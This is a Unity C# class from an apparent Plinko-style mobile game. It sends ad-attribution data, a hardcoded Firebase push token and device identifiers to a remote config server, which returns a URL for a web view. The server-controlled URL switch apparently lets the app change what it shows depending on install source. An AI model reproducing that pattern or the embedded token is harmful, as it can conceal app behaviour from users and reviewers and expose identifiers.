using System;
using System.Collections;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
using Newtonsoft.Json;
using UnityEngine.UI;
using static Enums;
using AppsFlyerSDK;
using System.Collections.Generic;



public static class RequestController
{
    public static RequestStage Stage { get; set; } = RequestStage.NotSent;



    public static string af_sub2 { get; internal set; }
    public static string media_source { get; internal set; }
    public static string af_sub5 { get; internal set; }
    public static string af_channel { get; internal set; }
    public static bool is_mobile_data_terms_signed { get; internal set; }

    public static string adgroup_id { get; internal set; }
    public static string af_sub4 { get; internal set; }
    public static bool is_paid { get; internal set; }
    public static string campaign { get; internal set; }
    public static string af_sub1 { get; internal set; }

    public static string ad_id { get; internal set; }
    public static bool iscache { get; internal set; }
    public static string click_time { get; internal set; }
    public static bool is_first_launch { get; internal set; }
    public static bool is_fb { get; internal set; }

    public static string adset_id { get; internal set; }
    public static string af_siteid { get; internal set; }
    public static string af_sub3 { get; internal set; }
    public static string agency { get; internal set; }
    public static string campaign_id { get; internal set; }


    public static string adgroup { get; internal set; }
    public static string af_adset { get; internal set; }
    public static string adset { get; internal set; }


    public static string redirect_response_data;
    public static string engmnt_source;
    public static string is_incentivized;
    public static string retargeting_conversion_type;
    public static string orig_cost;

    public static string af_click_lookback;
    public static bool CB_preload_equal_priority_enabled;
    public static string af_cpi;
    public static string is_branded_link;
    public static string match_type;

    public static string af_pmod_lookback_window;
    public static string advertising_id;
    public static string cost_cents_USD;
    public static string esp_name;
    public static string http_referrer;

    public static string is_universal_link;
    public static string is_retargeting;















    public static string WebViewUrl;

    public static bool FirebaseDataRecieved = false;
    public static bool AppsFlyerDataRecieved = false;

    public static string FirebaseProjectId = "399179364960";
    public static string FirebaseMessagingToken = "elb1oLoCT5iwEXr2xBPY0J:APA91bFu5mMDpD6twZg7ltcKlvRFHVhRAfrk4oUExRHgc-l2Jq1zStWpm2dNSvu2UBQJRs4Fxq5_8aYCmS2354tS3tcqGFcN0MugZaz3iYmqSjtRh50q-8k";

    public static string AppsFlyerId = "1744191756889-8092823156382116271";
    public static string InstallTime = "2025-04-09 08:42:14.457";
    public static string AfStatus;
    public static string AfMessage;
    public static string BundleId = "com.ADCompany.PlinkoMerge";


    private static readonly string _url = "https://pumkorich.com/config.php";


    public static void SendRequest()
    {
        CoroutineRunner.Instance.StartCoroutine(Request());
    }

    public static IEnumerator Request()
    {
        //AfStatus = "Non-organic"; // temp



        JsonBody body = new JsonBody();
         

        body.push_token = FirebaseMessagingToken;
        body.af_id = AppsFlyerId;
        body.bundle_id = BundleId;
        body.install_time = InstallTime;

        body.af_status = AfStatus;
        body.firebase_project_id = FirebaseProjectId;
        body.af_message = AfMessage;



        body.af_sub2 = af_sub2;
        body.media_source = media_source;
        body.af_sub5 = af_sub5;
        body.af_channel = af_channel;
        body.is_mobile_data_terms_signed = is_mobile_data_terms_signed;

        body.adgroup_id = adgroup_id;
        body.af_sub4 = af_sub4;
        body.is_paid = is_paid;
        body.campaign = campaign;
        body.af_sub1 = af_sub1;

        body.ad_id = ad_id;
        body.iscache = iscache;
        body.click_time = click_time;
        body.is_first_launch = is_first_launch;
        body.is_fb = is_fb;

        body.adset_id = adset_id;
        body.af_siteid = af_siteid;
        body.af_sub3 = af_sub3;
        body.agency = agency;
        body.campaign_id = campaign_id;

        body.adgroup = adgroup;
        body.af_adset = af_adset;
        body.adset = adset;



        /////
        ///

        body.redirect_response_data = redirect_response_data;
        body.engmnt_source = engmnt_source;
        body.is_incentivized = is_incentivized;
        body.retargeting_conversion_type = retargeting_conversion_type;
        body.orig_cost = orig_cost;

        body.af_click_lookback = af_click_lookback;
        body.CB_preload_equal_priority_enabled = CB_preload_equal_priority_enabled;
        body.af_cpi = af_cpi;
        body.is_branded_link = is_branded_link;
        body.match_type = match_type;

        body.af_pmod_lookback_window = af_pmod_lookback_window;
        body.advertising_id = advertising_id;
        body.cost_cents_USD = cost_cents_USD;
        body.esp_name = esp_name;
        body.http_referrer = http_referrer;

        body.is_universal_link = is_universal_link;
        body.is_retargeting = is_retargeting;


         






    string json = JsonConvert.SerializeObject(body);
        Debug.Log(json);


        using (UnityWebRequest webRequest = UnityWebRequest.Post(_url, json, "application/json"))
        {
            webRequest.SetRequestHeader("Content-Type", "application/json");

            Stage = RequestStage.Sent;

            yield return webRequest.SendWebRequest();


            Debug.Log("#!!!# Status Code: " + webRequest.responseCode + "  " + webRequest.error + "  " + webRequest.result);

            if (webRequest.responseCode == 200)
            {
                Debug.Log(webRequest.downloadHandler.text);

                SuccessResult successResult = JsonConvert.DeserializeObject<SuccessResult>(webRequest.downloadHandler.text);

                WebViewUrl = successResult.url;
                Stage = RequestStage.Successfull; //////////////////////
            }
            else
            {
                Stage = RequestStage.Unsuccessfull;
            }

            EventsProvider.OnConfigRequestDone?.Invoke(webRequest.responseCode == 200);
        }
    }

    public static void Check()
    {
        Debug.Log("### Check request " + FirebaseDataRecieved + AppsFlyerDataRecieved);

        if (FirebaseDataRecieved && AppsFlyerDataRecieved)
        {
            if (Stage == RequestStage.NotSent)
            {
                SendRequest();
            }
        }
    }
}


[System.Serializable]
public class SuccessResult
{
    public bool ok;
    public string url; 
    public long expires ; 
}
